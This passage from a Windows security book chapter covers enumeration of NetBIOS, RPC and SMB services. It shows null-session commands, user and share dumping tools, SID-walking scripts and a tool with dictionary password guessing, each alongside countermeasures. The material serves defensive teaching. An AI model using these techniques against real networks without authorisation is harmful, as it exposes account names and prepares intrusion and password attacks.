assessments of any  scale on a regular basis, we strongly recommend that you investigate the newest scanning  tools and services for incorporation into your broader security program or practice.  SUMMARY  In  this  chapter,  we’ve  identified  a  number  of  Windows  hosts  and  services,  although  additional  Windows  hosts  and  services  may  remain  undiscovered  behind  routers  or  firewalls. The next step is to probe these services further.

Many methods can be used to extract such information  from Windows, a process we call enumeration.  The key difference between previously discussed information-gathering techniques  and enumeration is in the level of intrusiveness: Enumeration involves active connections  to systems and directed queries  some exceptions might include passive enumeration  through IP stack profiling or promiscuous-mode sniffing . As such, they may  should!   be logged or otherwise noticed. We show you what to look for and how to block it, if  possible.  Much of the information gathered through enumeration may appear harmless at first  glance.  However,  the  information  that  leaks  from  the  following  holes  can  be  your  undoing, as we try to illustrate throughout this chapter. In general, once a valid username  or share is enumerated, it’s usually only a matter of time before the intruder guesses the  corresponding  password  or  identifies  some  weakness  associated  with  the  resource- sharing protocol. By closing these easily fixed loopholes, you eliminate the first foothold  of the malicious hacker.  Our discussion of Windows enumeration will focus on the following topics:     NetBIOS Name Service enumeration    Microsoft Remote Procedure Call  MSRPC  enumeration    Server Message Block  SMB  enumeration    Domain Name System  DNS  enumeration    Simple Network Management Protocol  SNMP  enumeration    Active Directory enumeration  First, let’s review the information we’ve gathered so far to establish how we’re going   to proceed.  PRELUDE: REVIEWING SCAN RESULTS  Enumeration techniques are mostly service specific and thus should be targeted using  information gathered in Chapter 3 via port scanning. Table 4-1 lists the key services that  will be sought out by attackers for enumeration purposes.  We  systematically  attack  these  services  in  the  upcoming  sections,  revealing   information that will make you cringe—all with no authentication required!  NetBIOS Names vs. IP Addresses  Remember that we can use information from ping sweeps  see Chapter 3  to substitute  IP addresses for the NetBIOS names of individual machines. IP address and NetBIOS  names  are  mostly  interchangeable   for  example,  \\192.168.202.5  can  be  equivalent  to    Chapter 4:   Enumeration   75  Port TCP 53 TCP 135 UDP 137 TCP 139 TCP 445 UDP 161 TCP UDP 389 TCP UDP 3268 TCP 3389  Service DNS zone transfer Microsoft RPC Endpoint Mapper NetBIOS Name Service  NBNS  NetBIOS session service  SMB over NetBIOS  SMB over TCP  Direct Host  Simple Network Management Protocol  SNMP  Lightweight Directory Access Protocol  LDAP  Global Catalog Service Terminal Services  Table 4-1  Windows Services Typically Targeted by Enumeration Attacks  \\SERVER_NAME . For convenience, attackers will often add the appropriate entries to  their  %systemroot%\system32\drivers\etc\LMHOSTS  file,  appended  with  the  PRE syntax, and then run nbtstat –R at a command line to reload the name table cache.  They are then free to use the NetBIOS name in future attacks, and it will be mapped  transparently to the IP address specified in LMHOSTS.  Beware  when  establishing  sessions  using  NetBIOS  names  versus  IP  addresses. All  subsequent commands must be launched against the original target. For example, if you  establish  a  null  session   see  the  next  section   with  \\192.168.2.5  and  then  attempt  to  extract information via this null session using the NetBIOS name of the same system, you  will not get a result. Windows remembers which name you specified, even if you don’t!  Disable and Block These Services! It goes without saying that one countermeasure for every vulnerability mentioned in this  chapter  is  to  disable  the  services  listed  in  Table  4-1.  If  you  cannot  disable  them  for  technical or political reasons, we will show you in acute detail how vulnerable you are.  We will also illustrate some specific countermeasures to mitigate the risk from running  these services. However, if these services are running, especially SMB  over NetBIOS or  TCP , you will always be exposed to some degree of risk.  Of course, it is also important to block access to these services at external network  gateways. These services are mostly designed to exist in an unauthenticated local area  network  LAN  environment. If they are available to the Internet, it will only be a matter  of time before a compromise results—it’s almost guaranteed.   76   Hacking Exposed Windows: Windows Security Secrets & Solutions   Last but not least, use defense in depth. Also configure host-based defenses to block  access to these services. The Windows Firewall that ships with modern Windows versions  is a great host-based mechanism to achieve this, and the default configurations generally  block  these  services  out  of  the  box   be  aware  that  upgrading  to  newer  versions  of  Windows can leave legacy settings intact .  In Vista and Windows Server 2008, the Windows Firewall comes preconfigured to  block almost all inbound connectivity using the Public profile  the Private and Domain  profiles allow more services . Also note that with Windows Firewall on Vista and later,  you can filter on secure connections  that is, those that originate from specified users  and or computers and are authenticated and or encrypted using IPSec , as well as IP  addresses.  Furthermore,  these  features  can  be  controlled  using  Group  Policy  across  Windows domains. Figure 4-1 shows the Vista Firewall configuration options for filtering  inbound connections to the NetBIOS Name Service  NBNS , which is one of the services  against which we’ll demonstrate attacks in this chapter.  In Vista and Windows Server 2008, to get access to advanced firewall settings, load the Windows  Firewall with Advanced Security MMC snap-in  Start  Run  “wf.msc”  instead of the default Windows  Firewall applet in the Control Panel. This will give you visibility into and control over the actual firewall  rules and other administrative settings.  Figure 4-1  Vista Firewall  with Advanced Security  options for ﬁ ltering inbound services  in this  example, NBNS    Chapter 4:   Enumeration   77  NETBIOS NAME SERVICE ENUMERATION  The first thing a remote attacker will try on a well-scouted Windows network is to get a  sense of what exists on the wire. Since Windows is still dependent on NBNS  UDP 137   by default, we sometimes call these activities “enumerating the NetBIOS wire.” The tools  and techniques for peering along the NetBIOS wire are readily available—in fact, most  are built into the various Windows operating systems! We discuss those first and then  move on to some third-party tools. We save discussion of countermeasures until the end,  since fixing all of this is rather simple and can be handled in one fell swoop.  Enumerating Domains with Net View  9 10 2 7  Popularity: Simplicity: Impact: Risk Rating: The net view command is a great example of a built-in enumeration tool. Net view  is an extraordinarily simple command-line utility that will list domains available on the  network and then lay bare all machines in a domain. Here’s how to enumerate domains  on the network using net view: C:\>net view  domain Domain ----------------------------------------------------------------------- CORLEONE BARZINI_DOMAIN TATAGGLIA_DOMAIN BRAZZI  The command completed successfully.  Supplying an argument to the  domain switch will list computers in a particular   domain, as shown next: C:\>net view  domain:corleone Server Name            Remark ----------------------------------------------------------------------- \\VITO                 Make him an offer he can't refuse \\MICHAEL              Nothing personal \\SONNY                Badda bing badda boom \\FREDO                I'm smart \\CONNIE               Don't forget the cannoli  For  the  command-line  challenged,  the  Network  Neighborhood  shows  essentially  the  same  information  shown  in  these  commands.  However,  because  of  the  sluggishness  of  updates to the browse list, we think the command-line tools are snappier and more reliable.   78   Hacking Exposed Windows: Windows Security Secrets & Solutions   Dumping the NetBIOS Name Table with Nbtstat and Nbtscan  Popularity: Simplicity: Impact: Risk Rating:  8 9 1 6  Another great built-in tool is nbtstat, which calls up the NetBIOS Name Table from a  remote system. The Name Table contains a great deal of information, as shown in the  following example: C:\>nbtstat -A 192.168.202.33 Local Area Connection: Node IpAddress: [192.168.234.244] Scope Id: []            NetBIOS Remote Machine Name Table        Name               Type         Status ---------------------------------------------                   CAESARS           UNIQUE      Registered                    VEGAS2            GROUP       Registered                    VEGAS2            GROUP       Registered                    CAESARS           UNIQUE      Registered                    VEGAS2            UNIQUE      Registered                    VEGAS2            GROUP       Registered                    VEGAS2            UNIQUE      Registered                    ..__MSBROWSE__.   GROUP       Registered                MAC Address = 00-01-03-27-93-8F  As illustrated, nbtstat extracts the system name  CAESARS , the domain or workgroup  it’s in  VEGAS2 , and the Media Access Control  MAC  address. These entities can be  identified by their NetBIOS suffixes  the two-digit hexadecimal number to the right of  the name , which are listed in Table 4-2.  Older versions of Windows would cough up information about any logged-on users  in nbtstat output. By default on newer versions of Windows, the Messenger service is  disabled, thus nbtstat output no longer contains this information. As you can see in Table  4-2, logged-on users would normally have an entry in the NetBIOS Name Table for the  Messenger service  see the row beginning with   . Since this service is off by  default  in  newer  versions  of  Windows,  the  NetBIOS  Name  Table  cannot  be  used  to  identify valid account names on the server.   Chapter 4:   Enumeration   79  NetBIOS Name                                                 Sufﬁ x 00 01  Name Type U U  01 03 06 1F 20 21 22 23 24 30 31 43 44 45 46 4C 52 87 6A BF 03  G U U U U U U U U U U U U U U U U U U U U  Service Workstation Messenger  for messages sent  to this computer  Master Browser Messenger RAS Server NetDDE Server RAS Client MS Exchange Interchange MS Exchange Store MS Exchange Directory Modem Sharing Server Modem Sharing Client SMS Clients Remote Control SMS Remote Control Tool SMS Client Remote Chat SMS Client Remote Transfer DEC Pathworks TCPIP DEC Pathworks TCPIP MS Exchange MTA Netmon Agent Netmon Application Messenger Service  for  messages sent to this user   Table 4-2  NetBIOS Sufﬁ xes with Associated Name Types and Services   80   Hacking Exposed Windows: Windows Security Secrets & Solutions   NetBIOS Name            >     IRISMULTICAST IRISNAMESERVER  Sufﬁ x 00 1B 1C 1D 1E 1C 00 2B 2F 33  Name Type G U G U G G U U G G  Service Domain Name Domain Master Browser Domain Controllers Master Browser Browser Service Elections IIS IIS Lotus Notes Server Lotus Notes Lotus Notes  Table 4-2  NetBIOS Sufﬁ xes with Associated Name Types and Services  continued   This  output  also  shows  no  information  on  running  services.  In  Windows  2000,  a  system running IIS would typically show the INet~Services entry in its table. The output  was taken from a Windows Server 2003 system running IIS, but this information does  not appear. We’re unsure what lies at the root of this behavior, but it’s a welcome change  security-wise, since it provides potential intruders with less information.  The Name Type column in Table 4-2 also has significance, as shown in Table 4-3.  NetBIOS Name Type Unique  U   Group  G   Multihomed  M   Table 4-3  NetBIOS Name Types  Description The name might have only one IP  address assigned to it. A unique name, but it might exist  with many IP addresses. The name is unique but may exist  on multiple interfaces of the same  computer.   Chapter 4:   Enumeration   81  Scanning NetBIOS Name Tables with Nbtscan  Popularity: Simplicity: Impact: Risk Rating:  The nbtstat utility has two drawbacks: it is restricted to operating on a single host at  a time, and it has rather inscrutable output. Both of those issues are addressed by the free  tool  nbtscan  from  Alla  Bezroutchko.  Nbtscan  will  “nbtstat”  an  entire  network  with  blistering speed and format the output nicely: C:\>nbtscan 192.168.234.0 24 Doing NBT name scan for adresses from 192.168.234.0 24  IP address      NetBIOS Name   Server    User        MAC address ---------------------------------------------------------------------- 192.168.234.31  PRNTSRV           PRINT       00-50-da-30-1e-0f 192.168.234.34  LAPTOP                00-b0-d0-56-bf-d4 192.168.234.43  LUXOR                 00-01-03-24-05-7e 192.168.234.44  LUXOR                 00-02-b3-16-db-2e 192.168.234.46  CAESARS               00-d0-b7-1f-e8-b0  Note in this output that only the server PRNTSRV indicates a logged-on user. This is the  only  Windows  2000  machine  listed  in  the  output,  highlighting  our  earlier  point  that  account names will no longer show up in NetBIOS Name Tables by default in newer  versions  of  Windows.  In  any  case,  nbtscan  is  a  great  way  to  flush  out  hosts  running  Windows on a network. Try running it against your favorite Class C–sized network, and  you’ll see what we mean. You may achieve erratic results running it across the Internet  due to the vagaries of NBNS over the Internet.  Enumerating Windows Domain Controllers  Popularity: Simplicity: Impact: Risk Rating:  5 8 2 5  6 7 2 5  To dig a little deeper into the Windows network structure, we’ll need to use a tool  from  the  Windows  Server  2003  Support  Tools.   Install  these  from  the  \support\tools  directory on the Windows Server 2003 CD-ROM.  In the next example, you’ll see how    82   Hacking Exposed Windows: Windows Security Secrets & Solutions   the tool called nltest identifies the domain controllers  the keepers of Windows network  authentication credentials  in a Windows domain: C:\>nltest  dclist:vegas2 Get list of DCs in domain 'vegas2' from '\\CAESARS'. You don't have access to DsBind to vegas2  \\CAESARS   Trying NetServerEnum . List of DCs in Domain vegas2     \\CAESARS  PDC  The command completed successfully  NetBIOS Network Enumeration Countermeasures All the preceding techniques operate over the NetBIOS Name Service, UDP 137.  Note  that the nltest command will also try directory-related services such as LDAP.  The  best way to prevent these activities is by blocking access to these ports using a router,  firewall, or other network gatekeeper. At the host level, configure the Windows Firewall  or Windows’ IPSec filters, or install some other host-based filtering functionality. In Vista,  the Windows Firewall Public Profile comes preconfigured with an NBNS-inbound rule,  but it is disabled by default, so all the attacks described in this section are blocked.  If you must allow access to NBNS, the only way to prevent user data from appearing  in  NetBIOS  Name  Table  dumps  is  to  disable  the  Alerter  and  Messenger  services  on  individual hosts. The startup behavior for these services can be configured through the  Services Control Panel. As we’ve noted earlier, these services are disabled by default on  newer Windows versions.  RPC ENUMERATION  Near and dear to NetBIOS Name Service in the pantheon of Windows services susceptible  to enumeration is Microsoft’s RPC Endpoint Mapper on TCP port 135. We’ll level with  you right up front and note that the information gathered via MSRPC is not on par with  that gathered from SMB  see the section “SMB Enumeration” later in this chapter , but  this service is almost always found on Windows networks and may even be exposed on  the Internet for such applications as Exchange.  RPC Enumeration  Popularity: Simplicity: Impact: Risk Rating:  7 8 1 5  Querying the RPC portmapper services on UNIX machines has traditionally been a  time-tested hacking technique. On Windows, the portmapper is called the RPC Endpoint  Mapper, and although the output is a lot messier than the UNIX equivalent, the concept    Chapter 4:   Enumeration   83  is the same. The epdump tool queries the RPC Endpoint Mapper and shows RPC service  interfaces bound to IP addresses and port numbers  albeit in a very crude form . This  tool has been around for so long that we’re not sure of its origins, but it’s still effective   we’ve truncated the following output significantly to highlight key points : C:\>epdump servername binding is 'ncacn_ip_tcp:servername' int 12345678-1234-abcd-ef00-0123456789ab v1.0    binding 0000@ncacn_ip_tcp:192.168.234.43[1025]    annot 'IPSec Policy agent endpoint' int 3473dd4d-2e88-4006-9cba-22570909dd10 v5.1    binding 0000@ncalrpc:[LRPC0000061c.00000001]    annot 'WinHttp Auto-Proxy Service' int 1ff70682-0a51-30e8-076d-740be8cee98b v1.0    binding 0000@ncacn_ip_tcp:192.168.234.43[1026]    annot '' The key things to note in this output are the int items, which specify RPC interfaces,  and each subsequent binding and annot entry. The binding specifies the IP address  and  port  number  on  which   for  example,  192.168.234.43[1025] ,  and  the  annotation  often  lists  the  common  name  of  the  endpoint  for example, 'IPSec Policy agent endpoint' .  the  RPC  endpoint   listening   is   More recent tools for dumping MSRPC endpoints include rpcdump. Several versions  of  rpcdump.exe  are  floating  around.  Don’t  be  confused  by  the  rpcdump  from  David  Litchfield  written circa 1999 , which is a tool for querying the UNIX portmapper on TCP  111.  The  other  two  versions  of  rpcdump  are  used  to  query  MSRPC—one  from  the  Resource Kit and another written by Todd Sabin that comes as part of his RPC Tools  suite. Sabin’s rpcdump adds the ability to query each registered RPC server for all the  interfaces it supports via the RpcMgmtInqIfIds API call, so it can report more that just  the  interfaces  a  server  has  registered.  Sabin’s  tool  is  a  lot  like  epdump,  listing  each  endpoint  in  sequence.  Rpcdump  from  the  Resource  Kit  categorizes  its  output  into  interface  types,  which  can  help  differentiate  local  RPC  interfaces  from  the  network   again, we’ve severely truncated the output here to highlight relevant information : C:\>rpcdump  s servername Querying Endpoint Mapper Database... 31 registered endpoints found.  ncacn_np Connection-oriented named pipes    \\SERVERNAME[\PIPE\protected_storage] [12345678]    IPSec Policy agent endpoint :NOT_PINGED  ncalrpc Local Rpc    [dsrole] [12345678] IPSec Policy agent endpoint   :NOT_PINGED   84   Hacking Exposed Windows: Windows Security Secrets & Solutions   ncacn_ip_tcp Connection-oriented TCP IP    192.168.234.44[1025] [12345778]  :NOT_PINGED   192.168.234.44[1026] [0a74ef1c]  :NOT_PINGED   192.168.234.44[1026] [378e52b0]  :NOT_PINGED   192.168.234.44[1026] [1ff70682]  :NOT_PINGED   192.168.234.44[1025] [12345678] IPSec Policy agent  endpoint :NOT_PINGED  rpcdump completed sucessfully after 1 seconds  You’ll note that none of the information disclosed in the output is overwhelmingly  useful to an attacker. Depending on the RPC endpoints available, further manipulation  could be possible. Typically, the most useful information in this output is the internal IP  address  of  multihomed  systems,  as  well  as  virtual  IP  addresses  hosted  on  the  same  server, which appear as RPC interface bindings. This data can give potential intruders a  better idea of what kind of system they are dealing with, including RPC applications that  are running, but that’s about it.  RPC Enumeration Countermeasures The best defense against RPC enumeration is to block access to the RPC Endpoint Mapper  service  RPC-EPMAP  on TCP UDP 135. This service is available by default on Windows  Server products  including 2008 , but not clients—it is blocked by the default Windows  Firewall  configuration  in  Vista  per  the  Remote  Administration   RPC-EPMAP   rule  defined by default for the Public and Private firewall profiles.  Outright blocking RPC-EPMAP can prove challenging to organizations that publish  MSRPC-based applications on the Internet, the primary example being Exchange, which  must have TCP 135 accessible for Messaging Application Programming Interface  MAPI   clients. Some workarounds to this situation include using Outlook Web Access  OWA   rather than MAPI or using RPC over HTTP  TCP 593 . You could also consider using a  firewall or virtual private network  VPN  to preauthenticate access to RPC; here again,  the built-in Windows Firewall in Vista and later provides this option out of the box.  To get more granular control over what named pipes can be accessed by anonymous  users, you could remove the EPMAPPER entry from the Network Access: Named Pipes  That Can Be Accessed Anonymously setting that can be accessed via Security Policy.  Don’t forget that the Endpoint Mapper only redirects clients to the appropriate RPC  port for an application—remember to lock down access to those ports as well. See the  “References and Further Reading” section at the end of this chapter for a link to more  information on restricting the dynamic allocation of RPC service endpoints.  SMB ENUMERATION  Next, we discuss the most widely enumerated Windows interface, Server Message Block   SMB ,  which  forms  the  basis  for  Microsoft’s  File  and  Print  Sharing  services.  In  our  discussion of SMB enumeration, we demonstrate the null session, which is an all-time  classic enumeration technique. The null session allows an anonymous attacker to extract  a great deal of information about a system—most importantly, account names.   Chapter 4:   Enumeration   85  SMB Enumeration: Null Sessions  Popularity: Simplicity: Impact: Risk Rating:  5 7 3 5  One  of  Windows’  most  serious  Achilles’  heels  has  traditionally  been  its  default  reliance  on  the  Common  Internet  File  System Server  Message  Block   CIFS SMB;  hereafter, just SMB  networking protocols. The SMB specs include APIs that return rich  information about a machine via TCP ports 139 and 445, even to unauthenticated users.  The first step in accessing these APIs remotely is creating just such an unauthenticated  connection  to  a  Windows  system  by  using  the  so-called  “null  session”  command,  assuming TCP port 139 or 445 is shown listening by a previous port scan: C:\>net use \\192.168.202.33\IPC$ ""  u:"" The command completed successfully. This  syntax  connects  to  the  hidden  interprocess  communications  “share”   IPC$   at  IP  address 192.168.202.33 as the built-in anonymous user   u: ""  with a null  ""  password.  If successful, the attacker now has an open channel over which to attempt all the various  techniques outlined in the rest of this section to pillage as much information as possible  from the target: network information, shares, users, groups, Registry keys, and so on.  Almost  all  the  information-gathering  techniques  described  in  this  section  on  host  enumeration take advantage of this single out-of-the-box security failing of Windows.  Whether you’ve heard it called the “Red Button” vulnerability, null session connections,  or anonymous logon, it can be the single most devastating network foothold sought by  intruders.  Microsoft has made some progress against disabling null sessions in default client configurations:  Windows client products including XP and later block null sessions out of the box. Null sessions are  still available by default on Windows Server products  including Server 2003 and 2008 as of Build  1715 ; however, access to sensitive information is blocked by default security policy configuration   some information is available if the machine is configured as a domain controller . Next we discuss  the various attacks that can be performed over null sessions against a Windows Server 2003 domain  controller  these attacks are blocked by default in Server 2008 .  Enumerating Shares  With a null session established, we can also fall back on good ol’ net  view to enumerate shares on remote systems: C:\>net view \\vito Shared resources at \\192.168.7.45  VITO   86   Hacking Exposed Windows: Windows Security Secrets & Solutions   Share name   Type         Used as  Comment  ----------------------------------------------------------------------- NETLOGON     Disk                  Logon server share Test         Disk                  Public access Finance      Disk                  Transaction records Web          Disk                  Webroot for acme.com The command completed successfully.  Three  other  good  share-enumeration  tools  from  the  Resource  Kit  are  rmtshare,  srvcheck, and srvinfo  using the –s switch . Rmtshare generates output similar to net  view.  Srvcheck  displays  shares  and  authorized  users,  including  hidden  shares,  but  it  requires privileged access to the remote system to enumerate users and hidden shares.  Srvinfo’s –s  parameter  lists  shares  along  with  a  lot  of  other  potentially  revealing  information.  Enumerating Trusted Domains  Once a null session is set up to one of the machines in the  enumerated  domain,  the  nltest   server:    domain_trusts  syntax  can  be  used to learn about other Windows domains with trust relationships to the first. This  information will come in handy when we discuss Local Security Authority  LSA  secrets  in Chapter 7.  Enumerating Users  In the good ol’ days of hacking, Windows machines would cough up  account information just about as easily as they revealed shares. Some key changes to the  default configuration around null session access in Windows XP and later have put a  stop to all that. For this reason, the following examples were run against a Windows  Server 2003 domain controller—this command would be denied against a default stand- alone or member server configuration.  A few Resource Kit tools can provide more information about users via null sessions,  such as the usrstat, showgrps, local, and global utilities. We typically use the local utility  to dump the members of the local Administrators group on a target server: C:\>local administrators \\caesars Administrator Enterprise Admins Domain Admins backadmin  Note that the RID 500 account is always listed first in this output and that additional  administrative accounts  such as backadmin  are listed after groups.  The global tool can be used in the same way to find the members of the Domain   Admins: C:\>global "domain admins" \\caesars Administrator backadmin   Chapter 4:   Enumeration   87  In  the  next  section,  we  discuss  some  all-in-one  enumeration  tools  that  also  do  a  great  job  of  enumerating  users,  in  addition  to  shares,  trusts,  and  other  tantalizing  information.  All-in-One SMB Enumeration Tools  The tools we’ve shown you so far are all single-purposed.  In  the  following  paragraphs,  we  introduce  some  all-purpose  enumeration  tools  that  perform all of the SMB enumeration techniques we’ve seen so far—and then some!  One  of  the  best  tools  for  enumerating  Windows  systems  is  DumpSec   formerly  DumpACL   from  SomarSoft.  Few  tools  deserve  their  place  in  the  Windows  security  auditor’s toolbox more than DumpSec. It audits everything from file system permissions  to services available on remote systems. DumpSec has an easy-to-use graphical interface,  or it can be run from the command line, making for easy automation and scripting.  To use DumpSec anonymously, first set up a null session to a remote system. Then, in  DumpSec, choose Report  Select Computer and type in the name of the remote system.   Make sure to use the exact name you used to create the null session, or you will get an  error.  Then select whatever report you want to run from the Reports menu. Figure 4-2  shows  DumpSec  being  used  to  dump  share  information  from  a  remote  computer  by  choosing Report  Dump Permissions For Shares. Note that this displays both hidden  and non-hidden shares.  Dumping shares over a null session is still possible by default on Windows Server  2003. DumpSec can also dump user account information, but only if the target system  has  been  configured  to  permit  release  of  such  information  over  a  null  session   some  might  say  misconfigured .  Windows  Server  2003  domain  controllers  will  permit  this  activity  by  default,  so  the  following  examples  were  run  against  that  target.  In  this  example, we use DumpSec from the command line to generate a file containing user   Figure 4-2  DumpSec reveals all shares over a null session.   88   Hacking Exposed Windows: Windows Security Secrets & Solutions    saveas=tsv  outfile=c:\temp\users.txt  information from the remote computer  remember that DumpSec requires a null session  with the target computer to operate : C:\>dumpsec  computer=\\caesars  rpt=usersonly C:\>cat c:\temp\users.txt 5 26 2003 3:39 PM - Somarsoft DumpSec  formerly DumpAcl  - \\caesars UserName        FullName        Comment Administrator Built-in account for administering the computer domain backadmin       backadmin Guest Built-in account for guest access to the computer domain IUSR_CAESARS Internet Guest Account  Built-in account for anonymous access to Internet Information Services IWAM_CAESARS    Launch IIS Process Account Built-in account for Internet Information Services to start out of process applications krbtgt          Key Distribution Center Service Account SUPPORT_388945a0   CN=Microsoft Corporation,L=Redmond,S=Washington,C=US This is a vendor's account for the Help and Support Service  Using the DumpSec GUI, many more information fields can be included in the report,  but the format shown here usually ferrets out troublemakers. For example, we once came  across a server that stored the password for the renamed Administrator account in the  FullName field!  DumpSec is also capable of gathering policies, user rights, and services over a null   session, but these items are restricted by default on Windows.  It took the RAZOR team from BindView to throw just about every SMB enumeration  feature  into  one  tool,  and  then  some.  They  called  it  enum—fittingly  enough  for  this  chapter.  The  following  listing  of  the  available  command-line  switches  for  this  tool  demonstrates how comprehensive it is. C:\>enum usage:  enum  [switches]  [hostnameip]   -U:  get userlist   -M:  get machine list   -N:  get namelist dump  different from -U-M    -S:  get sharelist   -P:  get password policy information   -G:  get group and member list   -L:  get LSA policy information   -D:  dictionary crack, needs -u and -f   -d:  be detailed, applies to -U and -S   -c:  don't cancel sessions   Chapter 4:   Enumeration   89    -u:  specify username to use  default ""    -p:  specify password to use  default ""    -f:  specify dictfile to use  wants -D   Enum even automates the setup and teardown of null sessions. Of particular note is  the password policy enumeration switch, -P, which tells remote attackers whether they  can remotely guess user account passwords  using –D, -u, and –f  until they find a weak  one. The following example has been edited for brevity to show enum in action against  a Windows Server 2003 domain controller: C:\>enum -U -d -P -L -c caesars server: caesars setting up session... success. password policy:   min length: none   min age: none   max age: 42 days   lockout threshold: none   lockout duration: 30 mins   lockout reset: 30 mins opening lsa policy... success. server role: 3 [primary  unknown ] names:   netbios: VEGAS2   domain: VEGAS2 quota:   paged pool limit: 33554432   non paged pool limit: 1048576   min work set size: 65536   max work set size: 251658240   pagefile limit: 0   time limit: 458672 trusted domains:   indeterminate netlogon done by a PDC server getting user list  pass 1, index 0 ... success, got 7.

Another great enumeration tool written by Sir Dystic, called nete  NetE , will extract  a wealth of information from a null session connection. We like to use the  0 switch to  perform  all  checks,  but  here’s  the  command  syntax  for  nete  to  give  some  idea  of  the  comprehensive information it can retrieve via null session: C:\>nete NetE v.96  Questions, comments, etc. to sirdystic@cultdeadcow.com  Usage: NetE [Options] \\MachinenameOrIP  Options:   0 - All NULL session operations   A - All operations   B - Get PDC name   C - Connections   D - Date and time   E - Exports   F - Files   G - Groups   I - Statistics   J - Scheduled jobs   K - Disks   L - Local groups   M - Machines   N - Message names   Q - Platform specific info   P - Printer ports and info   R - Replicated directories   S - Sessions   T - Transports   U - Users   V - Services   W - RAS ports   X - Uses   Y - Remote registry trees   Z - Trusted domains   Chapter 4:   Enumeration   91  Bypassing  RestrictAnonymous  Following  the  release  of  NT  4  Service  Pack  3,  Microsoft  attempted to defend against the null session enumeration vulnerability by creating the  RestrictAnonymous  configuration  option   see  the  upcoming  “SMB  Enumeration  Countermeasures” section . However, some enumeration tools and techniques will still  extract sensitive data from remote systems, even if RestrictAnonymous is configured to  restrict it. We’ll discuss some of these tools next.  Two extremely powerful Windows enumeration tools are sid2user and user2sid by  Evgenii Rudnyi. They are command-line tools that look up Windows SIDs from username  input  and  vice  versa.   SIDs  are  introduced  and  described  in  Chapter  2.   To  use  them  remotely requires null session access to the target machine. The following techniques  will  work  against  out-of-the-box  Windows  Server  2003  and  Server  2008  domain  controllers   since  the  policy Allow Anonymous  SID Name  Translation  is  enabled  by  default .  First, we extract a domain SID using user2sid:  C:\>user2sid \\192.168.202.33 "domain users" S-1-5-21-8915387-1645822062-1819828000-513  Number of subauthorities is 5 Domain is WINDOWSNT Length of SID in memory is 28 bytes Type of SID is SidTypeGroup  This tells us the SID for the machine—the string of numbers that begins with S-1 separated  by hyphens in the first line of output.  As we saw in Chapter 2, the numeric string following the last hyphen is called the  relative identifier  RID , and it is predefined for built-in Windows users and groups such  as Administrator or Guest. For example, the Administrator user’s RID is always 500, and  the Guest user’s RID is 501. Armed with this tidbit, a hacker can use sid2user and the  known SID string appended with a RID of 500 to find the name of the Administrator’s  account  even if it’s been renamed : C:\>sid2user \\192.168.2.33 5 21 8915387 1645822062 18198280005 500 Name is godzilla Domain is WINDOWSNT Type of SID is SidTypeUser  Note that the S-1 and hyphens are omitted. Another interesting factoid is that the first  account created on any Windows NT–family local system or domain is assigned an RID  of 1000, and each subsequent object gets the next sequential number after that  1001,  1002, 1003, and so on—RIDs are not reused on the current installation . Thus, once the  SID is known, a hacker can basically enumerate every user and group on an NT 2000  system, past and present.   92   Hacking Exposed Windows: Windows Security Secrets & Solutions   Here’s a simple example of how to script user2sid sid2user to loop through all of the  available user accounts on a system. Before running this script, we first determine the  SID  for  the  target  system  using  user2sid  over  a  null  session,  as  shown  previously.  Recalling  that  NT 2000  assigns  new  accounts  an  RID  beginning  with  1000,  we  then  execute the following loop using the NT 2000 shell command FOR and the sid2user tool   see earlier  to enumerate up to 50 accounts on a target: C:\>for  L %i IN  1000,1,1050  DO sid2user \\acmepdc1 5 21 1915163094  1258472701648912389 %I >> users.txt C:\>cat users.txt Name is IUSR_ACMEPDC1 Domain is ACME Type of SID is SidTypeUser  Name is MTS Trusted Impersonators Domain is ACME Type of SID is SidTypeAlias . . .  This raw output could be sanitized by piping it through a filter to leave just a list of  usernames. Of course, the scripting environment is not limited to the NT shell—Perl,  VBScript, or whatever is handy will do. As one last reminder before we move on, realize  that this example will successfully dump users as long as TCP port 139 or 445 is open on  the  target,  even  if  RestrictAnonymous  is  configured  to  the  moderately  conservative  setting of “1”  again, see the upcoming “SMB Enumeration Countermeasures” section  for explicit RestrictAnonymous values and their meaning .  The UserDump tool, discussed shortly, automates this “SID walking” enumeration technique.  Configure the Security Policy setting Network Access: Allow Anonymous SID Name Translation to  Disabled in Windows XP and later to prevent this attack.  The  UserInfo  tool  from  Tim  Mullen   thor@hammerofgod.com   will  enumerate  user  information  over  a  null  session  even  if  RestrictAnonymous  is  set  to  1.  By  querying  NetUserGetInfo API call at Level 3, UserInfo accesses the same sensitive information as  other  tools  like  DumpSec  that  are  stymied  by  RestrictAnonymous  =  1.

It enumerates the remote system SID  and  then  “walks”  expected  RID  values  to  gather  all  user  account  names.  UserDump  takes the name of a known user or group and iterates a user-specified number of times  through SIDs 1001 and up. UserDump will always get RID 500  Administrator  first, and  it then begins at RID 1001 plus the maximum number of queries specified.  A MaxQueries  setting of 0 or blank returns SID 500 and 1001.  Here’s a sample of UserDump in action  against a Windows Server 2003 domain controller: C:\>userdump \\mgmgrand guest 10         UserDump v1.11 - thor@hammerofgod.com          Querying Controller \\mgmgrand          USER INFO         Username:       Administrator         Full Name:         Comment:        Built-in account for            administering the computer domain         User Comment:         User ID:        500         Primary Grp:    513         Privs:          Admin Privs         OperatorPrivs:  No explicit OP Privs [snip] LookupAccountSid failed: 1007 does not exist...

Another  tool  called  GetAcct  by  Urity  performs  this  same  SID  walking  technique.  GetAcct has a graphical interface and can export results to a comma-separated file for  later analysis. It does not require the presence of an Administrator or Guest account on  the target server. GetAcct is shown in Figure 4-3, obtaining user account information  from a system with RestrictAnonymous = 1.

Next, we’re going to discuss  some major improvements to Windows XP and later that essentially eliminate the need  to worry about RestrictAnonymous.  SMB Enumeration Countermeasures Blocking  or  restricting  the  damage  feasible  via  Windows  SMB  enumeration  can  be  accomplished in several ways:     Block access to TCP ports 139 and 445 at the network or host level.    Disable SMB services.    Set Network Access settings in Security Policy appropriately.    Upgrading to Windows XP SP2 or later, which effectively blocks all the attacks   described so far in the default conﬁ guration  unless the system is a domain  controller .  The best way, of course, is to limit untrusted access to these services using a network  firewall, which is why we’ve listed this option first. Also consider the use of filters such  as the Windows Firewall on individual hosts to restrict SMB access and for “defense-in- depth,” in case the network edge firewall is penetrated.   Let’s discuss the other options in more depth.  Disabling SMB  Disabling SMB on Windows can be quite confusing depending on what  version of Windows you’re using. First, identify the network connection you want to  configure in the Network Connections Control Panel.  The connections with Local Area  Connection in their names are typically the primary LAN connections for the system; you  may have to spend some time figuring out which one is plugged into the network on  which you want to disable SMB.  On Vista and later, you’ll find network connections  under  Control  Panel\Network  and  Internet\Network  Connections.  Right-click  the  connection you want and select Properties. On the Properties 